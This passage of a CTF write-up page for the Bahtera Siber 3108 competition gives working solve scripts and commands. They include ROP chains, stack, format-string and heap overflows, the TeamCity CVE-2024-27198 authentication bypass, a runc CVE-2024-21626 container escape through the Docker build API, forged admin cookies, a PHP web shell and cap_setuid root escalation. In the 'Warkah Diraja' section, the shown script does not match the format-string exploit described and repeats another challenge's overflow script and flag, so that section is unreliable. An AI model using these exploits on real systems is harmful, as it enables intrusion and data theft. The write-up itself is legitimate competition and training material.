+OPEN  = 0x41c550
+WRITE = 0x41c710
+EXIT  = 0x41c400
+XCHG_EAX_EDI = 0x41fd7d
+BSS     = 0x4b1000
+FLAGBUF = BSS + 0x100
+FLAG_PATH = b&quot;/home/majlis/ketetapan.txt\x00&quot;
+BASE_INDEX = 82
+class Tube:
+def __init__(self):
+self.s = socket.create_connection((HOST, PORT))
+self.s.settimeout(0.2)
+self.buf = b&quot;&quot;
+def read(self):
+try:
+return self.s.recv(65536)
+except socket.timeout:
+return None
+def recvuntil(self, token, timeout=8):
+end = time.time() + timeout
+while token not in self.buf:
+if time.time() &gt; end:
+raise TimeoutError()
+data = self.read()
+if data:
+self.buf += data
+pos = self.buf.index(token) + len(token)
+out = self.buf[:pos]
+self.buf = self.buf[pos:]
+return out
+def recvany(self, tokens):
+while True:
+for i, token in enumerate(tokens):
+if token in self.buf:
+pos = self.buf.index(token) + len(token)
+out = self.buf[:pos]
+self.buf = self.buf[pos:]
+return i, out
+data = self.read()
+if data:
+self.buf += data
+def send(self, data):
+if isinstance(data, str):
+data = data.encode()
+self.s.sendall(data)
+def sendline(self, data):
+if isinstance(data, int):
+data = str(data)
+if isinstance(data, str):
+data = data.encode()
+self.send(data + b&quot;\n&quot;)
+def recvall(self, timeout=4):
+out = self.buf
+self.buf = b&quot;&quot;
+end = time.time() + timeout
+while time.time() &lt; end:
+data = self.read()
+if data:
+out += data
+end = time.time() + 0.5
+return out
+T = None
+attempts = 0
+def query(index, guess, new_value):
+global attempts
+T.recvuntil(b&quot;Giliran raja: &quot;)
+T.send(f&quot;{index}\n{guess}\n&quot;)
+result, _ = T.recvany([
+b&quot;Keutamaan baharu: &quot;,
+b&quot;Belum sampai giliran.&quot;,
+b&quot;Gilaran sudah terlepas.&quot;,
+b&quot;Giliran sudah terlepas.&quot;
+])
+attempts += 1
+if result == 0:
+T.sendline(new_value)
+return 0
+if result == 1:
+return -1
+return 1
+def set_byte(index, value):
+lo = -128
+hi = 127
+while lo &lt;= hi:
+mid = (lo + hi) // 2
+result = query(index, mid, value)
+if result == 0:
+return
+if result &lt; 0:
+lo = mid + 1
+else:
+hi = mid - 1
+raise Exception(&quot;byte not found&quot;)
+def set_qword(slot, value):
+offset = BASE_INDEX + slot * 8
+raw = struct.pack(&quot;&lt;Q&quot;, value)
+for i, byte in enumerate(raw):
+set_byte(offset + i, byte)
+def main():
+global T, attempts
+T = Tube()
+chain = {
+# read(0, BSS, 0x20)
+0: POP_RDI,
+1: 0,
+2: POP_RSI_R15,
+3: BSS,
+5: POP_RDX_RBX,
+6: 0x20,
+8: READ,
+# open(BSS, 0)
+9: POP_RDI,
+10: BSS,
+11: POP_RSI_R15,
+12: 0,
+14: OPEN,
+# edi = returned fd
+15: XCHG_EAX_EDI,
+# read(fd, FLAGBUF, 0x100)
+16: POP_RSI_R15,
+17: FLAGBUF,
+19: POP_RDX_RBX,
+20: 0x100,
+22: READ,
+# write(1, FLAGBUF, 0x100)
+23: POP_RDI,
+24: 1,
+25: POP_RSI_R15,
+26: FLAGBUF,
+28: POP_RDX_RBX,
+29: 0x100,
+31: WRITE,
+# exit(0)
+32: POP_RDI,
+33: 0,
+34: EXIT
+}
+for n, (slot, value) in enumerate(chain.items(), 1):
+set_qword(slot, value)
+if n % 5 == 0:
+print(
+f&quot;[*] wrote {n}/{len(chain)} qwords, &quot;
+f&quot;attempts={attempts}&quot;
+)
+remaining = TOTAL - attempts
+print(
+f&quot;[*] ROP ready; attempts={attempts}, &quot;
+f&quot;filler={remaining}&quot;
+)
+# Burn remaining turns
+T.recvuntil(b&quot;Giliran raja: &quot;)
+T.send(b&quot;-1\n&quot; * remaining)
+T.recvuntil(
+b&quot;Majlis bersurai. Ketetapan berkuat kuasa.&quot;,
+timeout=20
+)
+# First ROP read places the filename in BSS
+T.send(FLAG_PATH)
+output = T.recvall()
+print(output.decode(errors=&quot;ignore&quot;))
+flag = re.search(rb&quot;3108\{[^}\r\n]+\}&quot;, output)
+if flag:
+print(&quot;[+] FLAG:&quot;, flag.group().decode())
+if __name__ == &quot;__main__&quot;:
+if len(sys.argv) &gt;= 2:
+HOST = sys.argv[1]
+if len(sys.argv) &gt;= 3:
+PORT = int(sys.argv[2])
+main()</code></pre>
+<pre><code>3108{M4jl1s_B3rsur4i_T1t4h_T3rm3ter4i}</code></pre>
+<h3 id="cogan-alam">Cogan Alam</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Cogan Alam didukung di hadapan pemerintah dalam perarakan dan sesiapa yang mendukungnya berjalan dengan darjat yang dikurniakan kepadanya. Balai hanya mencatat nama pendukung dalam daftar perarakan. Derajat itu urusan balai, bukan urusan yang mencatat. Cuma, dalam daftar itu, darjat duduk terlalu hampir dengan nama.</p>
+</div>
+<p>The binary stores the supporter name and darjat value next to each other on the stack:</p>
+<p>char nama[64];</p>
+<p>uint32_t darjat;</p>
+<p>However, the program reads up to 72 bytes into nama, allowing us to overwrite the adjacent darjat variable.</p>
+<p>The required darjat is also leaked before input:</p>
+<p>Tera perarakan hari ini: 0x94002964</p>
+<p>So the payload is simply:</p>
+<p>64 bytes padding + leaked darjat</p>
+<p>Because the value is a 32-bit little-endian integer:</p>
+<p>payload = b&quot;A&quot; * 64 + p32(tera)</p>
+<p>This overwrites darjat with the correct leaked value and passes the check.</p>
+<h4>Solve.py</h4>
+<pre><code>#!/usr/bin/env python3
+import socket
+import struct
+import re
+import sys
+HOST = sys.argv[1]
+PORT = int(sys.argv[2])
+s = socket.create_connection((HOST, PORT))
+data = b&quot;&quot;
+while b&quot;Nama pendukung: &quot; not in data:
+chunk = s.recv(4096)
+if not chunk:
+break
+data += chunk
+print(data.decode(errors=&quot;replace&quot;), end=&quot;&quot;)
+m = re.search(
+rb&quot;Tera perarakan hari ini: 0x([0-9a-fA-F]{8})&quot;,
+data
+)
+if not m:
+print(&quot;[-] Tak jumpa leak tera&quot;)
+sys.exit(1)
+tera = int(m.group(1), 16)
+print(f&quot;[+] Tera = {tera:#010x}&quot;)
+payload = b&quot;A&quot; * 64
+payload += struct.pack(&quot;&lt;I&quot;, tera)
+print(f&quot;[+] Payload length = {len(payload)}&quot;)
+print(f&quot;[+] Payload = 64*A + p32({tera:#x})&quot;)
+s.sendall(payload)
+while True:
+chunk = s.recv(4096)
+if not chunk:
+break
+print(chunk.decode(errors=&quot;replace&quot;), end=&quot;&quot;)
+s.close()</code></pre>
+<pre><code>3108{c0g4n_4l4m_d1dukung_d4rj4t_d1r3but}</code></pre>
+<h3 id="warkah-diraja">Warkah Diraja</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Di Pejabat Warkah Diraja, jurutulis istana terlalu patuh: apa yang dititahkan, disurat semula tanpa disemak. Arkib menyimpan warkah yang tidak pernah dibuka kepada umum dan penyimpannya hanya berpegang pada satu nama fail sahaja. Tiada salinan dikurniakan kepada sesiapa. Yang ada hanyalah pintu, dan seorang jurutulis yang tidak tahu membezakan titah daripada arahan.</p>
+</div>
+<p>The service leaks a reference pointer:</p>
+<p>Cop rujukan: 0x58a92fd3b030</p>
+<p>The archive filename is located 0x20 bytes before this address:</p>
+<p>filename = reference - 0x20</p>
+<p>Using the format-string bug to read it reveals:</p>
+<p>warkah_00.txt</p>
+<p>The two archive digits start at offset +7, so the overwrite target is:</p>
+<p>target = reference - 0x20 + 7</p>
+<p>The packed address placed at payload offset 32 is accessible as format argument 18.</p>
+<pre><code>Using %18$hn, we can overwrite the two filename digits. For example, entry 31 requires ASCII bytes 3 and 1:</code></pre>
+<p>value = ord(&#x27;3&#x27;) | (ord(&#x27;1&#x27;) &lt;&lt; 8)</p>
+<pre><code>The payload prints value characters, writes it using %18$hn, then includes DAULAT so the modified archive filename is opened immediately.</code></pre>
+<p>fmt = f&quot;%{value}c%18$hnDAULAT&quot;.encode()</p>
+<p>payload = fmt.ljust(32, b&quot;A&quot;) + p64(target)</p>
+<p>Bruteforcing entries 00–99 finds the flag in warkah_31.txt</p>
+<pre><code>#!/usr/bin/env python3
+from pwn import *
+HOST = &quot;168.144.106.166&quot;
+PORT = 30000
+io = remote(HOST, PORT)
+io.recvuntil(b&quot;Tera perarakan hari ini: &quot;)
+tera = int(io.recvline().strip(), 16)
+io.recvuntil(b&quot;Nama pendukung: &quot;)
+payload = b&quot;A&quot; * 64 + p32(tera)
+io.send(payload)
+io.interactive()</code></pre>
+<pre><code>3108{c0g4n_4l4m_d1dukung_d4rj4t_d1r3but}</code></pre>
+<h3 id="cap-mohor">Cap Mohor</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Perbendaharaan Johor menyimpan cap mohor mengikut aturan simpanannya sendiri, bukan aturan yang diguna pakai orang lain. Setiap cap dimeterai dengan tera rahsia yang bertukar setiap kali balai dibuka, jadi tiada tera lama yang boleh dipakai semula. Namun tukang simpan tersilap kira ruang: apa yang terlebih itu jatuh ke tangan jiran sebelah, dan jiran itu bercakap lebih daripada sepatutnya.</p>
+</div>
+<h4>Analysis</h4>
+<p>The challenge is a static x86-64 ELF with NX enabled and no PIE. It manages &quot;cap mohor&quot; records with this structure:</p>
+<p>+0x00 function pointer</p>
+<p>+0x08 darjat</p>
+<p>+0x0c panjang</p>
+<p>+0x10 nama</p>
+<p>Option 6 verifies a record by calling:</p>
+<pre><code>record-&gt;fn(record + 0x10, record-&gt;panjang, record);</code></pre>
+<p>So controlling the function pointer gives control flow with useful controlled arguments.</p>
+<p>For darjat 3, the required seal value is:</p>
+<p>0x601f19c8</p>
+<p>1612650952</p>
+<h4>Vulnerability</h4>
+<p>The allocator reserves space for:</p>
+<pre><code>record header (0x10) + name</code></pre>
+<p>but Papar Cap and Ubah Cap incorrectly allow:</p>
+<p>chunk_size - 0x10</p>
+<p>bytes starting from record + 0x10.</p>
+<p>This causes a 0x10-byte overflow into the next chunk header.</p>
+<p>Using this, I:</p>
+<p>Corrupted slot 1&#x27;s chunk size from 0x60 to 0x300.</p>
+<p>Freed slot 2.</p>
+<p>Over-read the freed chunk and leaked the allocator free-list pointer.</p>
+<p>Derived the heap address of slot 3.</p>
+<p>Overwrote slot 3&#x27;s function pointer.</p>
+<p>The heap calculation was:</p>
+<p>slot1_chunk = next_free - 0x120</p>
+<pre><code>record3 = slot1_chunk + 0xd0</code></pre>
+<h4>Exploitation</h4>
+<p>I replaced slot 3&#x27;s function pointer with:</p>
+<p>setcontext = 0x405cbd</p>
+<p>Because option 6 passes:</p>
+<p>rdx = record3</p>
+<p>setcontext can restore registers from a fake context stored in the record and pivot execution to a controlled ROP chain.</p>
+<p>The final ROP performs an ORW attack:</p>
+<pre><code>open(&quot;/home/mohor/bendahari.txt&quot;, 0)</code></pre>
+<p>read(3, buffer, 0x100)</p>
+<p>write(1, buffer, 0x100)</p>
+<p>exit(0)</p>
+<pre><code>A shell was not needed because the seccomp policy still allowed the required file I/O syscalls.</code></pre>
+<p>The flag path was discovered from the challenge clue &quot;Perbendaharaan&quot;, pointing to bendahari:</p>
+<pre><code>/home/mohor/bendahari.txt</code></pre>
+<h4>Solve.py</h4>
+<pre><code>#!/usr/bin/env python3
+import os
+import re
+import socket
+import struct
+import subprocess
+import sys
+import time
+BIN = &quot;./daftar&quot;
+HOST = os.environ.get(&quot;HOST&quot;, &quot;168.144.106.166&quot;)
+PORT = int(os.environ.get(&quot;PORT&quot;, &quot;30008&quot;))
+DEBUG = os.environ.get(&quot;DEBUG&quot;) == &quot;1&quot;
+def p64(x):
+return struct.pack(&quot;&lt;Q&quot;, x &amp; 0xffffffffffffffff)
+def u64(b):
+return struct.unpack(&quot;&lt;Q&quot;, b.ljust(8, b&quot;\0&quot;))[0]
+class Tube:
+def __init__(self, remote=False):
+self.remote = remote
+if remote:
+self.s = socket.create_connection((HOST, PORT), timeout=8)
+self.s.settimeout(3)
+self.p = None
+else:
+argv = [&quot;qemu-x86_64&quot;, &quot;-strace&quot;, BIN] if os.environ.get(&quot;QEMU_STRACE&quot;) else [BIN]
+self.p = subprocess.Popen(argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+self.s = None
+def send(self, b):
+if isinstance(b, str):
+b = b.encode()
+if self.remote:
+self.s.sendall(b)
+else:
+self.p.stdin.write(b)
+self.p.stdin.flush()
+def recv_some(self, n=4096, timeout=0.2):
+if self.remote:
+old = self.s.gettimeout()
+self.s.settimeout(timeout)
+try:
+return self.s.recv(n)
+except socket.timeout:
+return b&quot;&quot;
+finally:
+self.s.settimeout(old)
+import select
+out = b&quot;&quot;
+end = time.time() + timeout
+fd = self.p.stdout.fileno()
+while time.time() &lt; end:
+r, _, _ = select.select([fd], [], [], max(0, end - time.time()))
+if not r:
+break
+chunk = os.read(fd, n)
+if not chunk:
+break
+out += chunk
+if len(chunk) &lt; n:
+break
+return out
+def recvuntil(self, marker, timeout=3):
+if isinstance(marker, str):
+marker = marker.encode()
+out = b&quot;&quot;
+end = time.time() + timeout
+while marker not in out and time.time() &lt; end:
+out += self.recv_some(timeout=0.05)
+return out
+def lineafter(self, marker, data):
+self.recvuntil(marker)
+self.send(str(data).encode() + b&quot;\n&quot;)
+def bytesafter(self, marker, data):
+self.recvuntil(marker)
+self.send(data)
+def menu(self, n):
+self.lineafter(b&quot;&gt; &quot;, n)
+def add(self, ln, darjat, name, seal=None):
+self.menu(1)
+self.lineafter(b&quot;Panjang nama: &quot;, ln)
+self.lineafter(b&quot;Darjat (0-3): &quot;, darjat)
+if darjat &gt; 1:
+self.lineafter(b&quot;Pengesahan mohor: &quot;, seal)
+self.recvuntil(b&quot;Nama: &quot;)
+self.send(name)
+if len(name) &lt; ln and not name.endswith(b&quot;\n&quot;):
+self.send(b&quot;\n&quot;)
+def show(self, slot):
+self.menu(2)
+self.lineafter(b&quot;Slot: &quot;, slot)
+return self.recvuntil(b&quot;&gt; &quot;, timeout=2)
+def edit(self, slot, data):
+self.menu(3)
+self.lineafter(b&quot;Slot: &quot;, slot)
+self.recvuntil(b&quot;Nama baharu: &quot;)
+self.send(data)
+def free(self, slot):
+self.menu(4)
+self.lineafter(b&quot;Slot: &quot;, slot)
+def seal_info(self):
+self.menu(5)
+return self.recvuntil(b&quot;&gt; &quot;, timeout=2)
+def verify(self, slot):
+self.menu(6)
+self.lineafter(b&quot;Slot: &quot;, slot)
+def calc_sah(addr, size, flags, magic):
+return (size ^ flags ^ magic ^ (addr &gt;&gt; 4)) &amp; 0xffffffff
+def parse_hex_name(out):
+m = re.search(rb&quot;nama\s+: ([0-9a-f]*)&quot;, out)
+if not m:
+raise RuntimeError(out.decode(errors=&quot;replace&quot;))
+return bytes.fromhex(m.group(1).decode())
+def main():
+remote = len(sys.argv) &gt; 1 and sys.argv[1] == &quot;remote&quot;
+flag_name = sys.argv[2].encode() if len(sys.argv) &gt; 2 else b&quot;flag&quot;
+read_fd = int(sys.argv[3]) if len(sys.argv) &gt; 3 else 3
+list_mode = flag_name.startswith(b&quot;LIST:&quot;)
+if list_mode:
+flag_name = flag_name[5:] or b&quot;.&quot;
+read_size = int(sys.argv[4], 0) if len(sys.argv) &gt; 4 else 0x100
+dents_syscall = int(os.environ.get(&quot;DENTS_SYSCALL&quot;, &quot;217&quot;), 0)
+t = Tube(remote)
+t.recvuntil(b&quot;&gt; &quot;)
+# Allocate adjacent chunks. A name length 0x100 gets a 0x120 allocator chunk;
+# show/edit use chunk_size - 0x10 for the name, leaking/overwriting the next header.
+t.add(0x100, 3, b&quot;A&quot; * 0x100, seal=0x601f19c8)
+t.add(0x20, 3, b&quot;B&quot; * 0x20, seal=0x601f19c8)
+t.add(0x20, 0, b&quot;C&quot; * 0x20)
+t.add(0x20, 0, b&quot;D&quot; * 0x20)
+leak = parse_hex_name(t.show(0))
+hdr_off = len(leak) - 0x10
+hdr = leak[hdr_off:hdr_off + 0x10]
+if DEBUG:
+print(&quot;leaked next header:&quot;, hdr.hex(), file=sys.stderr)
+magic = struct.unpack(&quot;&lt;I&quot;, hdr[0:4])[0]
+size2 = struct.unpack(&quot;&lt;I&quot;, hdr[4:8])[0]
+flags2 = struct.unpack(&quot;&lt;I&quot;, hdr[8:12])[0]
+sah2 = struct.unpack(&quot;&lt;I&quot;, hdr[12:16])[0]
+# sah = size ^ flags ^ magic ^ (chunk_addr &gt;&gt; 4)
+chunk2 = ((sah2 ^ size2 ^ flags2 ^ magic) &lt;&lt; 4) &amp; 0xffffffff0
+if DEBUG:
+print(f&quot;magic={magic:#x} size2={size2:#x} flags2={flags2:#x} sah2={sah2:#x} chunk2_low={chunk2:#x}&quot;, file=sys.stderr)
+# Enlarge slot 1&#x27;s allocator header, then free slot 2 and leak its free-list link.
+new_size = 0x300
+new_flags = 1
+new_sah = calc_sah(chunk2, new_size, new_flags, magic)
+t.edit(0, (b&quot;A&quot; * hdr_off + struct.pack(&quot;&lt;IIII&quot;, magic, new_size, new_flags, new_sah)).ljust(len(leak), b&quot;\0&quot;))
+t.recvuntil(b&quot;&gt; &quot;, timeout=1)
+t.free(2)
+t.recvuntil(b&quot;&gt; &quot;, timeout=1)
+leak1 = parse_hex_name(t.show(1))
+if DEBUG:
+print(&quot;slot1 leak len&quot;, len(leak1), file=sys.stderr)
+for off in range(0, min(len(leak1), 0x120), 0x10):
+print(f&quot;{off:04x}: {leak1[off:off+0x10].hex()}&quot;, file=sys.stderr)
+next_free = u64(leak1[0x60:0x68])
+slot1_chunk = next_free - 0x120
+record3 = slot1_chunk + 0xd0
+flag_s = record3 + 0xb0
+buf = record3 + 0x200
+rop = record3 + 0x120
+if DEBUG:
+print(f&quot;next_free={next_free:#x} slot1_chunk={slot1_chunk:#x} record3={record3:#x}&quot;, file=sys.stderr)
+SETCONTEXT = 0x405cbd
+OPEN = 0x41d550
+READ = 0x41d670
+WRITE = 0x41d710
+EXIT = 0x41d400
+POP_RDI = 0x401e3f
+POP_RSI_R15_RBP = 0x45a878
+POP_RAX = 0x42560b
+POP_RDX_OR_AL_PTR_RAX = 0x40e19b
+READABLE = 0x4aea00
+SYSCALL_RET = 0x40dd76
+if list_mode:
+chain = b&quot;&quot;.join([
+p64(257),
+p64(SYSCALL_RET),
+p64(POP_RDI), p64(read_fd),
+p64(POP_RSI_R15_RBP), p64(buf), p64(0), p64(record3 + 0x500),
+p64(POP_RAX), p64(READABLE),
+p64(POP_RDX_OR_AL_PTR_RAX), p64(0x400),
+p64(POP_RAX), p64(dents_syscall),
+p64(SYSCALL_RET),
+p64(POP_RDI), p64(1),
+p64(POP_RSI_R15_RBP), p64(buf), p64(0), p64(record3 + 0x500),
+p64(POP_RAX), p64(READABLE),
+p64(POP_RDX_OR_AL_PTR_RAX), p64(0x400),
+p64(WRITE),
+p64(POP_RDI), p64(0),
+p64(EXIT),
+])
+else:
+chain = b&quot;&quot;.join([
+p64(POP_RDI), p64(read_fd),
+p64(POP_RSI_R15_RBP), p64(buf), p64(0), p64(record3 + 0x500),
+p64(POP_RAX), p64(READABLE),
+p64(POP_RDX_OR_AL_PTR_RAX), p64(read_size),
+p64(READ),
+p64(POP_RDI), p64(1),
+p64(POP_RSI_R15_RBP), p64(buf), p64(0), p64(record3 + 0x500),
+p64(POP_RAX), p64(READABLE),
+p64(POP_RDX_OR_AL_PTR_RAX), p64(read_size),
+p64(WRITE),
+p64(POP_RDI), p64(0),
+p64(EXIT),
+])
+rec = bytearray(0x2f0 - 0xb0)
+rec[0:8] = p64(SETCONTEXT)
+rec[8:12] = struct.pack(&quot;&lt;I&quot;, 3)
+rec[12:16] = struct.pack(&quot;&lt;I&quot;, 0x20)
+rec[0x68:0x70] = p64(0xffffffffffffff9c if list_mode else flag_s)      # rdi
+rec[0x70:0x78] = p64(flag_s if list_mode else 0)           # rsi
+rec[0x78:0x80] = p64(record3 + 0x500)
+rec[0x88:0x90] = p64(0x10000 if list_mode else 0)           # rdx
+rec[0xe0:0xe8] = p64(record3 + 0x300)
+rec[0xa0:0xa8] = p64(rop)         # rsp before push return target
+rec[0xa8:0xb0] = p64(POP_RAX if list_mode else OPEN)        # first ret target
+rec[0xb0:0xb0 + len(flag_name) + 1] = flag_name + b&quot;\0&quot;
+rec[0x120:0x120 + len(chain)] = chain
+rec[0x1c0:0x1c4] = struct.pack(&quot;&lt;I&quot;, 0x1f80)
+payload = b&quot;X&quot; * 0xb0 + bytes(rec)
+payload = payload.ljust(0x2f0, b&quot;\0&quot;)
+t.edit(1, payload)
+t.recvuntil(b&quot;&gt; &quot;, timeout=1)
+t.verify(3)
+time.sleep(0.5)
+out = t.recv_some(4096, timeout=2)
+sys.stdout.buffer.write(out)
+if __name__ == &quot;__main__&quot;:
+main()</code></pre>
+<h4>Output</h4>
+<pre><code>3108{C4p_M0h0r_s4H_D1kurn14kaN}</code></pre>
+<h2 id="boot2root">Boot2Root</h2>
+<h3 id="warisan-takhta">Warisan Takhta</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Di sebalik kemegahan Istana Negara, tersembunyi sebuah rahsia digital yang menanti untuk dirungkai. Gunakan ketajaman minda dan kemahiran anda untuk meneliti setiap petunjuk, menembusi pertahanan, dan menyelusuri warisan yang tersembunyi di sebalik takhta.</p>
+</div>
+<h4>Target</h4>
+<pre><code>192.168.0.42</code></pre>
+<h4>Virtual hosts</h4>
+<pre><code>istana.bahtera
+teamcity.istana.bahtera</code></pre>
+<h4>1. User Flag</h4>
+<p>Enumeration found TeamCity 2023.05.3 running on:</p>
+<pre><code>teamcity.istana.bahtera</code></pre>
+<p>This version is vulnerable to CVE-2024-27198, an authentication bypass.</p>
+<p>The bypass worked using:</p>
+<p>/hax?jsp=/app/rest/server;.jsp</p>
+<p>This allowed access to the TeamCity REST API. After obtaining administrative access, the diagnostic command execution endpoint was enabled:</p>
+<p>/app/rest/debug/processes</p>
+<p>Commands executed as:</p>
+<pre><code>uid=1000(tcuser)</code></pre>
+<p>Further enumeration revealed an SSH private key:</p>
+<pre><code>/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/istana_rsa</code></pre>
+<p>The key belonged to:</p>
+<p>bahtera@istana-negara</p>
+<p>Connect to the host:</p>
+<pre><code>chmod 600 istana_rsa</code></pre>
+<pre><code>ssh -F /dev/null \</code></pre>
+<p>-i istana_rsa \</p>
+<p>-o IdentitiesOnly=yes \</p>
+<p>bahtera@192.168.0.42</p>
+<p>Read the user flag:</p>
+<pre><code>cat /home/bahtera/user.txt</code></pre>
+<h4>Flag</h4>
+<pre><code>3108{c87b3530ac50e65f6498a305160592c7}</code></pre>
+<h4>2. Root Flag</h4>
+<p>Host enumeration revealed:</p>
+<p>TeamCity</p>
+<p>Portainer CE 2.19.4</p>
+<p>tecnativa/docker-socket-proxy</p>
+<p>The Docker API proxy was reachable at:</p>
+<pre><code>172.18.0.3:2375</code></pre>
+<p>Although container creation and execution were blocked, the Docker Build API was allowed.</p>
+<p>Version enumeration showed:</p>
+<pre><code>Docker 24.0.8
+runc 1.1.11</code></pre>
+<p>runc 1.1.11 is vulnerable to CVE-2024-21626, part of the Leaky Vessels container escape vulnerabilities.</p>
+<pre><code>Since Docker builds create temporary containers, the vulnerable runtime could be triggered through /build.</code></pre>
+<h4>Dockerfile</h4>
+<pre><code>FROM ubuntu:22.04
+WORKDIR /proc/self/fd/8
+RUN cat ../../../../root/root.txt</code></pre>
+<p>Exploit:</p>
+<pre><code>tmpdir=$(mktemp -d)</code></pre>
+<pre><code>printf &#x27;%s\n&#x27; \</code></pre>
+<p>&#x27;FROM ubuntu:22.04&#x27; \</p>
+<p>&#x27;WORKDIR /proc/self/fd/8&#x27; \</p>
+<p>&#x27;RUN cat ../../../../root/root.txt&#x27; \</p>
+<p>&gt; &quot;$tmpdir/Dockerfile&quot;</p>
+<pre><code>tar -C &quot;$tmpdir&quot; -cf - Dockerfile | \
+curl -sS \</code></pre>
+<p>-H &#x27;Content-Type: application/x-tar&#x27; \</p>
+<p>--data-binary @- \</p>
+<p>&#x27;http://172.18.0.3:2375/build?rm=1&amp;forcerm=1&#x27;</p>
+<p>The build escaped the container filesystem and read the host root flag:</p>
+<pre><code>3108{fa857de946c9dc988a22e7c9780e43c1}</code></pre>
+<h4>3. Post Flag</h4>
+<p>Using the same host file-read primitive, further enumeration revealed:</p>
+<pre><code>/opt/istana/arkib-diraja/inventori.txt</code></pre>
+<p>The directory was a Git repository.</p>
+<p>Git history showed:</p>
+<p>33472ea Permulaan migrasi arkib digital</p>
+<p>f32a1e8 Import imbasan arkib lama</p>
+<p>8b611f4 Buang imbasan rosak selepas migrasi</p>
+<p>The latest commit had deleted:</p>
+<pre><code>warkah_lama.png</code></pre>
+<p>The deleted file was recovered from the previous commit:</p>
+<pre><code>git show f32a1e85864151fc7ed031d93c3f216cf682df79:warkah_lama.png \</code></pre>
+<p>&gt; warkah_lama.png</p>
+<p>Opening the recovered image revealed the Post flag:</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-20.png" alt="Bahtera Siber 3108 CTF evidence 20"></figure>
+<pre><code>3108{d41d8cd98f00b204e9800998ecf8427e}</code></pre>
+<h3 id="warta-kelate">Warta Kelate</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Pejabat warta Darul Naim mengendalikan sistem e-Warta buatan sendiri untuk menyiarkan warta diraja lama, buatan tangan, dan sikit terlalu mudah percaya. Cari jalan masuk, panjat dari pijakan kecil hingga ke takhta, dan kutip kedua-dua warkah sepanjang perjalanan.</p>
+</div>
+<p>The server exposes its .git directory, allowing the web source to be recovered.</p>
+<pre><code>curl http://192.168.0.211/.git/HEAD
+curl http://192.168.0.211/.git/config</code></pre>
+<p>Recovered .gitignore:</p>
+<pre><code>warta/config.php
+warta/uploads/
+warta/auth.php contains the HMAC key used for authentication:
+$AUTH_KEY = &#x27;kelate-warta-2010::hmac-key::jange-bagi-oghe&#x27;;</code></pre>
+<p>Forge an admin cookie:</p>
+<pre><code>php -r &#x27;$k=&quot;kelate-warta-2010::hmac-key::jange-bagi-oghe&quot;; $d=&quot;admin|admin&quot;; echo base64_encode($d.&quot;|&quot;.hash_hmac(&quot;sha256&quot;,$d,$k)).&quot;\n&quot;;&#x27;</code></pre>
+<p>Result:</p>
+<pre><code>warta_auth=YWRtaW58YWRtaW58ZGE5MjE4MWM0ODVmY2E3MTNkM2M4ZThkM2I0YWUyMDdiMTY0YWNhMzQzNTMzMDIwOTAwZjJkYzYyMTgxYTRmNg==</code></pre>
+<h4>RCE</h4>
+<p>Create an image/PHP polyglot:</p>
+<pre><code>GIF89a
+&lt;?php system($_GET[&#x27;cmd&#x27;] ?? &#x27;id&#x27;); ?&gt;</code></pre>
+<p>Upload it as .pht:</p>
+<pre><code>curl -b &#x27;warta_auth=YWRtaW58YWRtaW58ZGE5MjE4MWM0ODVmY2E3MTNkM2M4ZThkM2I0YWUyMDdiMTY0YWNhMzQzNTMzMDIwOTAwZjJkYzYyMTgxYTRmNg==&#x27; \</code></pre>
+<p>-F &#x27;warta=@shell.pht;filename=shell.pht;type=image/gif&#x27; \</p>
+<pre><code>http://192.168.0.211/warta/upload.php</code></pre>
+<p>Confirm execution:</p>
+<pre><code>http://192.168.0.211/warta/uploads/shell.pht?cmd=id</code></pre>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-21.png" alt="Bahtera Siber 3108 CTF evidence 21"></figure>
+<h4>Read config file</h4>
+<pre><code>http://192.168.0.211/warta/uploads/shell.pht?cmd=base64%20%2Fvar%2Fwww%2Fhtml%2Fwarta%2Fconfig.php</code></pre>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-22.png" alt="Bahtera Siber 3108 CTF evidence 22"></figure>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-23.png" alt="Bahtera Siber 3108 CTF evidence 23"></figure>
+<h4>User Flag</h4>
+<p>Got into ssh by the creds we got and get user.txt</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-24.png" alt="Bahtera Siber 3108 CTF evidence 24"></figure>
+<pre><code>3108{47a155cafb53ee9aacdf700486356077}</code></pre>
+<h4>Root Flag</h4>
+<p>Check Linux capabilities and found below interesting.</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-25.png" alt="Bahtera Siber 3108 CTF evidence 25"></figure>
+<p>Running warta-audit gives a Python interpreter. Since the binary has cap_setuid, set UID to 0:</p>
+<pre><code>import os</code></pre>
+<p>os.setuid(0)</p>
+<p>os.system(&#x27;id; cat /root/root.txt&#x27;)</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-26.png" alt="Bahtera Siber 3108 CTF evidence 26"></figure>
+<pre><code>3108{cf1bd2eb6bd2fe7bb343a76fd5fe4363}</code></pre>
+          </div>
+        </article>
+        <aside class="right-rail"><section><h2>Recently Updated</h2><div id="recentPosts" class="rail-list"></div></section></aside>
+      </div>
+    </main>
+    <script src="../posts-data.js?v=bahtera-3108"></script>
+    <script src="../script.js?v=categories-collapse"></script>
+  </body>
+</html>
